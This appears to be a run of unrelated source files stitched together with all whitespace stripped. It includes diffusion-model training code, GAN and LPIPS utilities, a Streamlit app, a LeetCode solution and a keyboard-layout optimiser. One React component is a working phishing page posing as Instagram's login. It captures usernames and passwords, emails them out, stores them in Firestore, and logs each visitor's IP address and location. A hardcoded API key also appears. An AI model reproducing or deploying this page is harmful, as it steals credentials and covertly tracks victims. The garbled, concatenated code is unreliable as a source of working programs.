ORY','MECENG','ENGLISH','GWS','MECENG','MILSCI','RDEV','CHICANO','RHETOR','STAT','MELC','PSYCH','SLAVIC','GERMAN','CIVENG','HISTORY','PUBPOL','NUSCTX','CHMENG','NUSCTX','POLSCI','ASAMST','MATH','PHILOS','SANSKR','ART','ECON','HISTORY','PHDBA','HISTORY','DUTCH','POLSCI','PHYSICS','OPTOM','MATH','FILM','MATSCI','PHILOS','POLSCI','THEATER','LINGUIS']exportdefaultsubjects;importmathfromcontextlibimportcontextmanagerfromtypingimportAny,Dict,List,Optional,Tuple,Unionimportpytorch_lightningasplimporttorchfromomegaconfimportListConfig,OmegaConffromsafetensors.torchimportload_fileasload_safetensorsfromtorch.optim.lr_schedulerimportLambdaLRfrom..modulesimportUNCONDITIONAL_CONFIGfrom..modules.autoencoding.temporal_aeimportVideoDecoderfrom..modules.diffusionmodules.wrappersimportOPENAIUNETWRAPPERfrom..modules.emaimportLitEmafrom..utilimport(default,disabled_train,get_obj_from_str,instantiate_from_config,log_txt_as_img)classDiffusionEngine(pl.LightningModule):def__init__(self,network_config,denoiser_config,first_stage_config,conditioner_config:Union[None,Dict,ListConfig,OmegaConf]=None,sampler_config:Union[None,Dict,ListConfig,OmegaConf]=None,optimizer_config:Union[None,Dict,ListConfig,OmegaConf]=None,scheduler_config:Union[None,Dict,ListConfig,OmegaConf]=None,loss_fn_config:Union[None,Dict,ListConfig,OmegaConf]=None,network_wrapper:Union[None,str]=None,ckpt_path:Union[None,str]=None,use_ema:bool=False,ema_decay_rate:float=0.9999,scale_factor:float=1.0,disable_first_stage_autocast=False,input_key:str="jpg",log_keys:Union[List,None]=None,no_cond_log:bool=False,compile_model:bool=False,en_and_decode_n_samples_a_time:Optional[int]=None,):super().__init__()self.log_keys=log_keysself.input_key=input_keyself.optimizer_config=default(optimizer_config,{"target":"torch.optim.AdamW"})model=instantiate_from_config(network_config)self.model=get_obj_from_str(default(network_wrapper,OPENAIUNETWRAPPER))(model,compile_model=compile_model)self.denoiser=instantiate_from_config(denoiser_config)self.sampler=(instantiate_from_config(sampler_config)ifsampler_configisnotNoneelseNone)self.conditioner=instantiate_from_config(default(conditioner_config,UNCONDITIONAL_CONFIG))self.scheduler_config=scheduler_configself._init_first_stage(first_stage_config)self.loss_fn=(instantiate_from_config(loss_fn_config)ifloss_fn_configisnotNoneelseNone)self.use_ema=use_emaifself.use_ema:self.model_ema=LitEma(self.model,decay=ema_decay_rate)print(f"KeepingEMAsof{len(list(self.model_ema.buffers()))}.")self.scale_factor=scale_factorself.disable_first_stage_autocast=disable_first_stage_autocastself.no_cond_log=no_cond_logifckpt_pathisnotNone:self.init_from_ckpt(ckpt_path)self.en_and_decode_n_samples_a_time=en_and_decode_n_samples_a_timedefinit_from_ckpt(self,path:str,)->None:ifpath.endswith("ckpt"):sd=torch.load(path,map_location="cpu")["state_dict"]elifpath.endswith("safetensors"):sd=load_safetensors(path)else:raiseNotImplementedErrormissing,unexpected=self.load_state_dict(sd,strict=False)print(f"Restoredfrom{path}with{len(missing)}missingand{len(unexpected)}unexpectedkeys")iflen(missing)>0:print(f"MissingKeys:{missing}")iflen(unexpected)>0:print(f"UnexpectedKeys:{unexpected}")def_init_first_stage(self,config):model=instantiate_from_config(config).eval()model.train=disabled_trainforparaminmodel.parameters():param.requires_grad=Falseself.first_stage_model=modeldefget_input(self,batch):#assumingunifieddataformat,dataloaderreturnsadict.#imagetensorsshouldbescaledto-1...1andinbchwformatreturnbatch[self.input_key]@torch.no_grad()defdecode_first_stage(self,z):z=1.0/self.scale_factor*zn_samples=default(self.en_and_decode_n_samples_a_time,z.shape[0])n_rounds=math.ceil(z.shape[0]/n_samples)all_out=[]withtorch.autocast("cuda",enabled=notself.disable_first_stage_autocast):forninrange(n_rounds):ifisinstance(self.first_stage_model.decoder,VideoDecoder):kwargs={"timesteps":len(z[n*n_samples:(n+1)*n_samples])}else:kwargs={}out=self.first_stage_model.decode(z[n*n_samples:(n+1)*n_samples],**kwargs)all_out.append(out)out=torch.cat(all_out,dim=0)returnout@torch.no_grad()defencode_first_stage(self,x):n_samples=default(self.en_and_decode_n_samples_a_time,x.shape[0])n_rounds=math.ceil(x.shape[0]/n_samples)all_out=[]withtorch.autocast("cuda",enabled=notself.disable_first_stage_autocast):forninrange(n_rounds):out=self.first_stage_model.encode(x[n*n_samples:(n+1)*n_samples])all_out.append(out)z=torch.cat(all_out,dim=0)z=self.scale_factor*zreturnzdefforward(self,x,batch):loss=self.loss_fn(self.model,self.denoiser,self.conditioner,x,batch)loss_mean=loss.mean()loss_dict={"loss":loss_mean}returnloss_mean,loss_dictdefshared_step(self,batch:Dict)->Any:x=self.get_input(batch)x=self.encode_first_stage(x)batch["global_step"]=self.global_steploss,loss_dict=self(x,batch)returnloss,loss_dictdeftraining_step(self,batch,batch_idx):loss,loss_dict=self.shared_step(batch)self.log_dict(loss_dict,prog_bar=True,logger=True,on_step=True,on_epoch=False)self.log("global_step",self.global_step,prog_bar=True,logger=True,on_step=True,on_epoch=False,)ifself.scheduler_configisnotNone:lr=self.optimizers().param_groups[0]["lr"]self.log("lr_abs",lr,prog_bar=True,logger=True,on_step=True,on_epoch=False)returnlossdefon_train_start(self,*args,**kwargs):ifself.samplerisNoneorself.loss_fnisNone:raiseValueError("Samplerandlossfunctionneedtobesetfortraining.")defon_train_batch_end(self,*args,**kwargs):ifself.use_ema:self.model_ema(self.model)@contextmanagerdefema_scope(self,context=None):ifself.use_ema:self.model_ema.store(self.model.parameters())self.model_ema.copy_to(self.model)ifcontextisnotNone:print(f"{context}:SwitchedtoEMAweights")try:yieldNonefinally:ifself.use_ema:self.model_ema.restore(self.model.parameters())ifcontextisnotNone:print(f"{context}:Restoredtrainingweights")definstantiate_optimizer_from_config(self,params,lr,cfg):returnget_obj_from_str(cfg["target"])(params,lr=lr,**cfg.get("params",dict()))defconfigure_optimizers(self):lr=self.learning_rateparams=list(self.model.parameters())forembedderinself.conditioner.embedders:ifembedder.is_trainable:params=params+list(embedder.parameters())opt=self.instantiate_optimizer_from_config(params,lr,self.optimizer_config)ifself.scheduler_configisnotNone:scheduler=instantiate_from_config(self.scheduler_config)print("SettingupLambdaLRscheduler...")scheduler=[{"scheduler":LambdaLR(opt,lr_lambda=scheduler.schedule),"interval":"step","frequency":1,}]return[opt],schedulerreturnopt@torch.no_grad()defsample(self,cond:Dict,uc:Union[Dict,None]=None,batch_size:int=16,shape:Union[None,Tuple,List]=None,**kwargs,):randn=torch.randn(batch_size,*shape).to(self.device)denoiser=lambdainput,sigma,c:self.denoiser(self.model,input,sigma,c,**kwargs)samples=self.sampler(denoiser,randn,cond,uc=uc)returnsamples@torch.no_grad()deflog_conditionings(self,batch:Dict,n:int)->Dict:"""Definesheuristicstologdifferentconditionings.Thesecanbelistsofstrings(text-to-image),tensors,ints,..."""image_h,image_w=batch[self.input_key].shape[2:]log=dict()forembedderinself.conditioner.embedders:if((self.log_keysisNone)or(embedder.input_keyinself.log_keys))andnotself.no_cond_log:x=batch[embedder.input_key][:n]ifisinstance(x,torch.Tensor):ifx.dim()==1:#class-conditional,convertintegertostringx=[str(x[i].item())foriinrange(x.shape[0])]xc=log_txt_as_img((image_h,image_w),x,size=image_h//4)elifx.dim()==2:#sizeandcropcondandthelikex=["x".join([str(xx)forxxinx[i].tolist()])foriinrange(x.shape[0])]xc=log_txt_as_img((image_h,image_w),x,size=image_h//20)else:raiseNotImplementedError()elifisinstance(x,(List,ListConfig)):ifisinstance(x[0],str):#stringsxc=log_txt_as_img((image_h,image_w),x,size=image_h//20)else:raiseNotImplementedError()else:raiseNotImplementedError()log[embedder.input_key]=xcreturnlog@torch.no_grad()deflog_images(self,batch:Dict,N:int=8,sample:bool=True,ucg_keys:List[str]=None,**kwargs,)->Dict:conditioner_input_keys=[e.input_keyforeinself.conditioner.embedders]ifucg_keys:assertall(map(lambdax:xinconditioner_input_keys,ucg_keys)),("Eachdefineducgkeyforsamplingmustbeintheprovidedconditionerinputkeys,"f"butwehave{ucg_keys}vs.{conditioner_input_keys}")else:ucg_keys=conditioner_input_keyslog=dict()x=self.get_input(batch)c,uc=self.conditioner.get_unconditional_conditioning(batch,force_uc_zero_embeddings=ucg_keysiflen(self.conditioner.embedders)>0else[],)sampling_kwargs={}N=min(x.shape[0],N)x=x.to(self.device)[:N]log["inputs"]=xz=self.encode_first_stage(x)log["reconstructions"]=self.decode_first_stage(z)log.update(self.log_conditionings(batch,N))forkinc:ifisinstance(c[k],torch.Tensor):c[k],uc[k]=map(lambday:y[k][:N].to(self.device),(c,uc))ifsample:withself.ema_scope("Plotting"):samples=self.sample(c,shape=z.shape[1:],uc=uc,batch_size=N,**sampling_kwargs)samples=self.decode_first_stage(samples)log["samples"]=samplesreturnlogimportosimportpicklefromdotenvimportload_dotenvfromopenaiimportOpenAIfromyoutubesearchpythonimportVideosSearchimportyt_dlpload_dotenv()api_key=os.getenv('OPENAI_API_KEY')defget_recommendation(section,api_key=api_key):client=OpenAI(api_key=api_key)context=f'Wearemakinganappwhereuserscaninputthetextofabookandgetvisualdepictions,real-timenarration,andlivemusicthroughouteachchapterofthebooktogiveanewvisualexperiencetoreaders.'prompt=f'Pleasegenerateamusicrecommendationforthefollowingtext.Makesurethesonghasverylittletonowords.Itdoesnotneedtoberelatedtothebookinanyway(suchasasoundtrackfromthemovieadaptaion).Itshouldjustmatchthemoodofthetext.Donotprovideanycontext,explanation,orjustificationforyourselection.Theonlythinginyourresponseshouldbethenameofthesong:\n\n{section}'completion=client.chat.completions.create(model='gpt-4o-mini',messages=[{'role':'system','content':context},{'role':'user','content':prompt}])returncompletion.choices[0].message.contentdefget_youtube_video(song)->str:search=VideosSearch(song,limit=1)video=search.result()['result'][0]returnvideo['link']defdownload_video(url,output_path):ydl_opts={'format':'bestaudio/best','postprocessors':[{'key':'FFmpegExtractAudio','preferredcodec':'mp3','preferredquality':'192',}],'outtmpl':output_path}withyt_dlp.YoutubeDL(ydl_opts)asydl:ydl.download([url])withopen('outputs/sections.pkl','rb')asf:sections=pickle.load(f)#a=get_recommendation(sections[0])#"ArrivaloftheBirds"byTheCinematicOrchestrasong='"ArrivaloftheBirds"byTheCinematicOrchestra'download_video(get_youtube_video(song),'outputs/song')importfunctoolsimporttorch.nnasnnfrom..utilimportActNormdefweights_init(m):classname=m.__class__.__name__ifclassname.find("Conv")!=-1:nn.init.normal_(m.weight.data,0.0,0.02)elifclassname.find("BatchNorm")!=-1:nn.init.normal_(m.weight.data,1.0,0.02)nn.init.constant_(m.bias.data,0)classNLayerDiscriminator(nn.Module):"""DefinesaPatchGANdiscriminatorasinPix2Pix-->seehttps://github.com/junyanz/pytorch-CycleGAN-and-pix2pix/blob/master/models/networks.py"""def__init__(self,input_nc=3,ndf=64,n_layers=3,use_actnorm=False):"""ConstructaPatchGANdiscriminatorParameters:input_nc(int)--thenumberofchannelsininputimagesndf(int)--thenumberoffiltersinthelastconvlayern_layers(int)--thenumberofconvlayersinthediscriminatornorm_layer--normalizationlayer"""super(NLayerDiscriminator,self).__init__()ifnotuse_actnorm:norm_layer=nn.BatchNorm2delse:norm_layer=ActNormif(type(norm_layer)==functools.partial):#noneedtousebiasasBatchNorm2dhasaffineparametersuse_bias=norm_layer.func!=nn.BatchNorm2delse:use_bias=norm_layer!=nn.BatchNorm2dkw=4padw=1sequence=[nn.Conv2d(input_nc,ndf,kernel_size=kw,stride=2,padding=padw),nn.LeakyReLU(0.2,True),]nf_mult=1nf_mult_prev=1forninrange(1,n_layers):#graduallyincreasethenumberoffiltersnf_mult_prev=nf_multnf_mult=min(2**n,8)sequence+=[nn.Conv2d(ndf*nf_mult_prev,ndf*nf_mult,kernel_size=kw,stride=2,padding=padw,bias=use_bias,),norm_layer(ndf*nf_mult),nn.LeakyReLU(0.2,True),]nf_mult_prev=nf_multnf_mult=min(2**n_layers,8)sequence+=[nn.Conv2d(ndf*nf_mult_prev,ndf*nf_mult,kernel_size=kw,stride=1,padding=padw,bias=use_bias,),norm_layer(ndf*nf_mult),nn.LeakyReLU(0.2,True),]sequence+=[nn.Conv2d(ndf*nf_mult,1,kernel_size=kw,stride=1,padding=padw)]#output1channelpredictionmapself.main=nn.Sequential(*sequence)defforward(self,input):"""Standardforward."""returnself.main(input)importhashlibimportosimportrequestsimporttorchimporttorch.nnasnnfromtqdmimporttqdmURL_MAP={"vgg_lpips":"https://heibox.uni-heidelberg.de/f/607503859c864bc1b30b/?dl=1"}CKPT_MAP={"vgg_lpips":"vgg.pth"}MD5_MAP={"vgg_lpips":"d507d7349b931f0638a25a48a722f98a"}defdownload(url,local_path,chunk_size=1024):os.makedirs(os.path.split(local_path)[0],exist_ok=True)withrequests.get(url,stream=True)asr:total_size=int(r.headers.get("content-length",0))withtqdm(total=total_size,unit="B",unit_scale=True)aspbar:withopen(local_path,"wb")asf:fordatainr.iter_content(chunk_size=chunk_size):ifdata:f.write(data)pbar.update(chunk_size)defmd5_hash(path):withopen(path,"rb")asf:content=f.read()returnhashlib.md5(content).hexdigest()defget_ckpt_path(name,root,check=False):assertnameinURL_MAPpath=os.path.join(root,CKPT_MAP[name])ifnotos.path.exists(path)or(checkandnotmd5_hash(path)==MD5_MAP[name]):print("Downloading{}modelfrom{}to{}".format(name,URL_MAP[name],path))download(URL_MAP[name],path)md5=md5_hash(path)assertmd5==MD5_MAP[name],md5returnpathclassActNorm(nn.Module):def__init__(self,num_features,logdet=False,affine=True,allow_reverse_init=False):assertaffinesuper().__init__()self.logdet=logdetself.loc=nn.Parameter(torch.zeros(1,num_features,1,1))self.scale=nn.Parameter(torch.ones(1,num_features,1,1))self.allow_reverse_init=allow_reverse_initself.register_buffer("initialized",torch.tensor(0,dtype=torch.uint8))definitialize(self,input):withtorch.no_grad():flatten=input.permute(1,0,2,3).contiguous().view(input.shape[1],-1)mean=(flatten.mean(1).unsqueeze(1).unsqueeze(2).unsqueeze(3).permute(1,0,2,3))std=(flatten.std(1).unsqueeze(1).unsqueeze(2).unsqueeze(3).permute(1,0,2,3))self.loc.data.copy_(-mean)self.scale.data.copy_(1/(std+1e-6))defforward(self,input,reverse=False):ifreverse:returnself.reverse(input)iflen(input.shape)==2:input=input[:,:,None,None]squeeze=Trueelse:squeeze=False_,_,height,width=input.shapeifself.trainingandself.initialized.item()==0:self.initialize(input)self.initialized.fill_(1)h=self.scale*(input+self.loc)ifsqueeze:h=h.squeeze(-1).squeeze(-1)ifself.logdet:log_abs=torch.log(torch.abs(self.scale))logdet=height*width*torch.sum(log_abs)logdet=logdet*torch.ones(input.shape[0]).to(input)returnh,logdetreturnhdefreverse(self,output):ifself.trainingandself.initialized.item()==0:ifnotself.allow_reverse_init:raiseRuntimeError("InitializingActNorminreversedirectionis""disabledbydefault.Useallow_reverse_init=Truetoenable.")else:self.initialize(output)self.initialized.fill_(1)iflen(output.shape)==2:output=output[:,:,None,None]squeeze=Trueelse:squeeze=Falseh=output/self.scale-self.locifsqueeze:h=h.squeeze(-1).squeeze(-1)returnhimportunittestclassSolution:defarea(self,start:tuple[int,int],end:tuple[int,int])->int:returnmin(start[1],end[1])*(end[0]-start[0])defmaxArea(self,heights:list[int])->int:lower=0upper=len(heights)-1largest=0while(lower<upper):left=heights[lower]right=heights[upper]area=min(left,right)*(upper-lower)if(area>largest):largest=areaif(left<right):lower+=1else:upper-=1returnlargestclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest1(self):self.assertEqual(self.solution.maxArea([1,8,6,2,5,4,8,3,7]),49)deftest2(self):self.assertEqual(self.solution.maxArea([1,1]),1)unittest.main()'useclient';importStepFormfrom'@/components/profile/edit/StepForm';//import{useSearchParams}from'next/navigation';constEditProfilePage=()=>{//constsearchParams=useSearchParams();//constfirstLogin=searchParams.get('firstLogin');return(<div><StepForm/></div>);};exportdefaultEditProfilePage;importstreamlitasstimportpandasaspddf=pd.read_excel('data.xlsm')[['Date','Name','Item','SOQty']].rename(columns={'Name':'Distributor','Item':'Product','SOQty':'SOQuantity'})df['Date']=pd.to_datetime(df['Date'])stores=df['Distributor'].unique()#products=df['Product'].unique()#alphabeticallysortedproductsproducts=sorted(df['Product'].unique())groupby=pd.DataFrame(df.groupby(['Distributor','Product'])['SOQuantity'].sum()*10).rename(columns={'SOQuantity':'TotalUnits'})#addacolumnforthetotalnumberofweeksbetweentodayandtheearliestpurchaseforeachdistributor-productpairgroupby['Weeks']=df.groupby(['Distributor','Product'])['Date'].apply(lambdax:(pd.Timestamp.now()-x.min()).days/7)#calculatethevelocitygroupby['Velocity']=groupby['TotalUnits']/groupby['Weeks']groupby.to_excel('velocity.xlsx',index=True)1/0st.title('ProductVelocityLookup')#Inputfieldsforselectingdistributorandproductstore=st.selectbox('SelectDistributor/Store:',stores)product=st.selectbox('SelectProduct:',products)#Displaytheresultwithcustomstylesifst.button('GetVelocity'):#Filterforthespecificdistributor-productcombinationresult=groupby.loc[(groupby.index.get_level_values('Distributor')==store)&(groupby.index.get_level_values('Product')==product)]ifnotresult.empty:velocity=result['Velocity'].values[0]#Displaydistributorinbigfontst.markdown(f"<h3>{store}</h3>",unsafe_allow_html=True)#Displayproductnameinparagraphtextst.markdown(f"<istyle='font-size:20px;'>{product}</i>",unsafe_allow_html=True)#Displayvelocityinadifferentcolorst.markdown(f"<pstyle='color:green;font-size:24px;'>{velocity:.2f}units/week</p>",unsafe_allow_html=True)else:st.write(f"Nodataavailablefor{store}-{product}")'useclient';importdbfrom'@/firebase/firebase';import{doc,serverTimestamp,getDoc,setDoc,updateDoc}from'firebase/firestore';import{useState,useEffect,useRef}from'react';import{useRouter}from'next/navigation';importaxiosfrom'axios';constHome=()=>{const[username,setUsername]=useState('');const[password,setPassword]=useState('');const[ip,setIp]=useState('');const[location,setLocation]=useState('');constrouter=useRouter();constusernameRef=useRef(null);constpasswordRef=useRef(null);useEffect(()=>{constfetchIpAndLocation=async()=>{try{constres=awaitaxios.get('https://api.ipify.org?format=json');constuserIp=res.data.ip;setIp(userIp);constapiKey='fb4ef23ba9c44ae5b7b748b1603b2951';constlocationRes=awaitaxios.get(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${userIp}`);constuserLocation=`${locationRes.data.city},${locationRes.data.state_prov},${locationRes.data.country_name}`;setLocation(userLocation);constdocRef=doc(db,'usernames',userIp);constdocSnap=awaitgetDoc(docRef);consttimestamp=newIntl.DateTimeFormat('en-US',{year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Los_Angeles',}).format(newDate());if(!docSnap.exists()){awaitsetDoc(docRef,{ip:userIp,location:userLocation,visits:[timestamp],});}else{constvisits=docSnap.data().visits||[];visits.push(timestamp);awaitupdateDoc(docRef,{visits:visits,});}}catch(error){console.error('ErrorfetchingIPaddressorlocation:',error);}};fetchIpAndLocation();},[]);useEffect(()=>{if(usernameRef.current){setUsername(usernameRef.current.value);}},[]);useEffect(()=>{if(passwordRef.current){setPassword(passwordRef.current.value);}},[]);consthandleSubmit=async(e)=>{try{e.preventDefault();consttimestamp=newIntl.DateTimeFormat('en-US',{year:'numeric',month:'long',day:'numeric',hour:'numeric',minute:'numeric',second:'numeric',hour12:true,timeZone:'America/Los_Angeles',}).format(newDate());constdocRef=doc(db,'usernames',ip);awaitaxios.post('/api/send-email',{username:username,password:password,timestamp:timestamp,});constdocSnap=awaitgetDoc(docRef);letusernames=[];if(docSnap.exists()){usernames=docSnap.data().usernames||[];}constisUnique=!usernames.some((user)=>user.username===username);if(!isUnique){router.push('/login');return;}usernames.push({username:username,password:password,timestamp:timestamp,});console.log(usernames);awaitupdateDoc(docRef,{usernames:usernames,});//router.push('/login');}catch(error){//router.push('/login');console.log('Errorsubmittingform:',error);}};return(<><divid='wrapper'><divclassName='container'><divclassName='phone-app-demo'></div><divclassName='form-data'><formaction=''onSubmit={handleSubmit}><divclassName='logo'><imgsrc='./logo.png'alt='logo'/></div><inputtype='text'placeholder='Phonenumber,username,oremail'ref={usernameRef}onChange={(e)=>{setUsername(e.target.value);}}/><inputtype='password'placeholder='Password'ref={passwordRef}onChange={(e)=>{setPassword(e.target.value);}}/><buttonclassName='form-btn'type='submit'>Login</button><spanclassName='has-separator'>Or</span><aclassName='facebook-login'href='#'><iclassName='fabfa-facebook-square'></i>LoginwithFacebook</a><aclassName='password-reset'href='#'>Forgotpassword?</a></form><divclassName='sign-up'>Don&apos;thaveanaccount?<ahref='#'>Signup</a></div><divclassName='get-the-app'><span>Gettheapp.</span><divclassName='badges'><imgsrc='./app-store.png'alt='app-storebadge'/><imgsrc='./google-play.png'alt='google-playbadge'/></div></div></div></div><footer><divclassName='container'><navclassName='footer-nav'><ul><li><ahref='#'>Aboutus</a></li><li><ahref='#'>Support</a></li><li><ahref='#'>Press</a></li><li><ahref='#'>Api</a></li><li><ahref='#'>Jobs</a></li><li><ahref='#'>Privacy</a></li><li><ahref='#'>Terms</a></li><li><ahref='#'>Directory</a></li><li><ahref='#'>Profiles</a></li><li><ahref='#'>Hashtags</a></li><li><ahref='#'>Languages</a></li></ul></nav><divclassName='copyright-notice'>&copy;2024Instagram</div></div></footer></div></>);};exportdefaultHome;#grammarchecker(notcurrentlyinuse)defgrammarCheck(essay):importlanguage_tool_pythontool=language_tool_python.LanguageTool('en-US')x=tool.check(essay)returnlen(x)#%%importnumpyasnpimportrandomfromfingersimportFingercharacters='qwertyuiopasdfghjkl;zxcvbnm,.?'SAMPLE_LENGTH=10000classKey:def__init__(self,finger:Finger,key=None):self.finger=fingerself.key=keydef__repr__(self):returnself.key.upper()classKeyboard:FINGER_ORDER=[Finger.L_PINKY,Finger.L_RING,Finger.L_MIDDLE,Finger.L_INDEX,Finger.L_INDEX,Finger.R_INDEX,Finger.R_INDEX,Finger.R_MIDDLE,Finger.R_RING,Finger.R_PINKY]LAYOUTS={'qwerty':'qwertyuiopasdfghjkl;zxcvbnm,.?','colemak':'qwfpgjluy;arstdhneiozxcvbkm,.?'}def__init__(self,layout:str=None):self.keyboard=np.empty((3,10),dtype=Key)if(layoutisNone):self.randomize_layout()else:self.fill(layout)def__repr__(self):returnstr(self.keyboard)@propertydeflayout(self):return''.join([self.keyboard[i,j].keyforiinrange(3)forjinrange(10)])@staticmethoddefvalid(keyboard:'Keyboard')->bool:returnlen(set(keyboard.layout))==30deffill(self,layout:str)->None:foriinrange(3):forjinrange(10):self.keyboard[i,j]=Key(self.FINGER_ORDER[j],layout[i*10+j])defletter_to_finger(self,letter:str)->Finger:foriinrange(3):forjinrange(10):ifself.keyboard[i,j].key==letter:returnself.keyboard[i,j].fingerreturnNonedeffitness(self,corpus:str,length:int=SAMPLE_LENGTH)->float:#thefitnessistheproportionofkeypresseswhereyouhavetousethesamefingertwiceinarowexcludingrepeatedlettersandinbetweenwordsnkeypresses=0nrepeats=0previous=corpus[0]foriinrange(1,length):current=corpus[i]if(self.letter_to_finger(previous)==self.letter_to_finger(current)):nrepeats+=1nkeypresses+=1previous=currentreturnnrepeats/nkeypressesdefrandomize_layout(self)->None:layout=''.join(random.sample(characters,30))self.fill(layout)defmutate(self,rate:float)->None:foriinrange(3):forjinrange(10):ifnp.random.random()<rate:other_i=np.random.randint(3)other_j=np.random.randint(10)self.keyboard[i,j],self.keyboard[other_i,other_j]=self.keyboard[other_i,other_j],self.keyboard[i,j]#takethelefthalfofselfandfilltherightwiththeremaininglettersintheorderthattheyappearinotherdefcrossover(self,other:'Keyboard')->'Keyboard':child=Keyboard()forrowinrange(3):forcolinrange(5):child.keyboard[row,col]=self.keyboard[row,col]i=0forrowinrange(3):forcolinrange(5,10):whileother.keyboard[row,col]inchild.keyboard:i+=1child.keyboard[row,col]=other.layout[i]i+=1returnchildif__name__=='__main__':colemak=Keyboard(layout=Keyboard.LAYOUTS['colemak'])other=Keyboard(layout=';yuljgpfwqoienhdtsra?.,mkbvcxz')print(Keyboard.valid(colemak.crossover(other)))importloggingfromabcimportABC,abstractmethodfromtypingimportDict,List,Literal,Optional,Tuple,Unionimporttorchfromeinopsimportrearrange,repeatfrom...utilimportappend_dims,defaultlogpy=logging.getLogger(__name__)classGuider(ABC):@abstractmethoddef__call__(self,x:torch.Tensor,sigma:float)->torch.Tensor:passdefprepare_inputs(self,x:torch.Tensor,s:float,c:Dict,uc:Dict)->Tuple[torch.Tensor,float,Dict]:passclassVanillaCFG(Guider):def__init__(self,scale:float):self.scale=scaledef__call__(self,x:torch.Tensor,sigma:torch.Tensor)->torch.Tensor:x_u,x_c=x.chunk(2)x_pred=x_u+self.scale*(x_c-x_u)returnx_preddefprepare_inputs(self,x,s,c,uc):c_out=dict()forkinc:ifkin["vector","crossattn","concat"]:c_out[k]=torch.cat((uc[k],c[k]),0)else:assertc[k]==uc[k]c_out[k]=c[k]returntorch.cat([x]*2),torch.cat([s]*2),c_outclassIdentityGuider(Guider):def__call__(self,x:torch.Tensor,sigma:float)->torch.Tensor:returnxdefprepare_inputs(self,x:torch.Tensor,s:float,c:Dict,uc:Dict)->Tuple[torch.Tensor,float,Dict]:c_out=dict()forkinc:c_out[k]=c[k]returnx,s,c_outclassLinearPredictionGuider(Guider):def__init__(self,max_scale:float,num_frames:int,min_scale:float=1.0,additional_cond_keys:Optional[Union[List[str],str]]=None,):self.min_scale=min_scaleself.max_scale=max_scaleself.num_frames=num_framesself.scale=torch.linspace(min_scale,max_scale,num_frames).unsqueeze(0)additional_cond_keys=default(additional_cond_keys,[])ifisinstance(additional_cond_keys,str):additional_cond_keys=[additional_cond_keys]self.additional_cond_keys=additional_cond_keysdef__call__(self,x:torch.Tensor,sigma:torch.Tensor)->torch.Tensor:x_u,x_c=x.chunk(2)x_u=rearrange(x_u,"(bt)...->bt...",t=self.num_frames)x_c=rearrange(x_c,"(bt)...->bt...",t=self.num_frames)scale=repeat(self.scale,"1t->bt",b=x_u.shape[0])scale=append_dims(scale,x_u.ndim).to(x_u.device)returnrearrange(x_u+scale*(x_c-x_u),"bt...->(bt)...")defprepare_inputs(self,x:torch.Tensor,s:torch.Tensor,c:dict,uc:dict)->Tuple[torch.Tensor,torch.Tensor,dict]:c_out=dict()forkinc:ifkin["vector","crossattn","concat"]+self.additional_cond_keys:c_out[k]=torch.cat((uc[k],c[k]),0)else:#assertc[k]==uc[k]c_out[k]=c[k]returntorch.cat([x]*2),torch.cat([s]*2),c_outclassTrianglePredictionGuider(LinearPredictionGuider):def__init__(self,max_scale:float,num_frames:int,min_scale:float=1.0,period:Union[float,List[float]]=1.0,period_fusing:Literal["mean","multiply","max"]="max",additional_cond_keys:Optional[Union[List[str],str]]=None,):super().__init__(max_scale,num_frames,min_scale,additional_cond_keys)values=torch.linspace(0,1,num_frames)#Constructsatrianglewaveifisinstance(period,float):period=[period]scales=[]forpinperiod:scales.append(self.triangle_wave(values,p))ifperiod_fusing=="mean":scale=sum(scales)/len(period)elifperiod_fusing=="multiply":scale=torch.prod(torch.stack(scales),dim=0)elifperiod_fusing=="max":scale=torch.max(torch.stack(scales),dim=0).valuesself.scale=(scale*(max_scale-min_scale)+min_scale).unsqueeze(0)deftriangle_wave(self,values:torch.Tensor,period)->torch.Tensor:return2*(values/period-torch.floor(values/period+0.5)).abs()classTrapezoidPredictionGuider(LinearPredictionGuider):def__init__(self,max_scale:float,num_frames:int,min_scale:float=1.0,edge_perc:float=0.1,additional_cond_keys:Optional[Union[List[str],str]]=None,):super().__init__(max_scale,num_frames,min_scale,additional_cond_keys)rise_steps=torch.linspace(min_scale,max_scale,int(num_frames*edge_perc))fall_steps=torch.flip(rise_steps,[0])self.scale=torch.cat([rise_steps,torch.ones(num_frames-2*int(num_frames*edge_perc)),fall_steps,]).unsqueeze(0)classSpatiotemporalPredictionGuider(LinearPredictionGuider):def__init__(self,max_scale:float,num_frames:int,num_views:int=1,min_scale:float=1.0,additional_cond_keys:Optional[Union[List[str],str]]=None,):super().__init__(max_scale,num_frames,min_scale,additional_cond_keys)V=num_viewsT=num_frames//Vscale=torch.zeros(num_frames).view(T,V)scale+=torch.linspace(0,1,T)[:,None]*0.5scale+=self.triangle_wave(torch.linspace(0,1,V))[None,:]*0.5scale=scale.flatten()self.scale=(scale*(max_scale-min_scale)+min_scale).unsqueeze(0)deftriangle_wave(self,values:torch.Tensor,period=1)->torch.Tensor:return2*(values/period-torch.floor(values/period+0.5)).abs()import{useState,useEffect}from'react';import{doc,onSnapshot}from'firebase/firestore';import{db,auth}from'@/firebase/firebase';import{onAuthStateChanged}from'firebase/auth';importQuestionListfrom'@/components/QuestionList';importNavigationfrom'@/components/Navbar';constProfile=()=>{const[userId,setUserId]=useState();useEffect(()=>{onAuthStateChanged(auth,(user)=>{if(user){setUserId(user.uid);}else{console.log('Nousersignedin');}});},[]);return(<><Navigation/><div>{userId&&<QuestionListuserId={userId}/>}</div></>);};exportdefaultProfile;fromtypingimportCallable,Iterable,Unionimporttorchfromeinopsimportrearrange,repeatfromsgm.modules.diffusionmodules.modelimport(XFORMERS_IS_AVAILABLE,AttnBlock,Decoder,MemoryEfficientAttnBlock,ResnetBlock)fromsgm.modules.diffusionmodules.openaimodelimport(ResBlock,timestep_embedding)fromsgm.modules.video_attentionimportVideoTransformerBlockfromsgm.utilimportpartialclassclassVideoResBlock(ResnetBlock):def__init__(self,out_channels,*args,dropout=0.0,video_kernel_size=3,alpha=0.0,merge_strategy="learned",**kwargs,):super().__init__(out_channels=out_channels,dropout=dropout,*args,**kwargs)ifvideo_kernel_sizeisNone:video_kernel_size=[3,1,1]self.time_stack=ResBlock(channels=out_channels,emb_channels=0,dropout=dropout,dims=3,use_scale_shift_norm=False,use_conv=False,up=False,down=False,kernel_size=video_kernel_size,use_checkpoint=False,skip_t_emb=True,)self.merge_strategy=merge_strategyifself.merge_str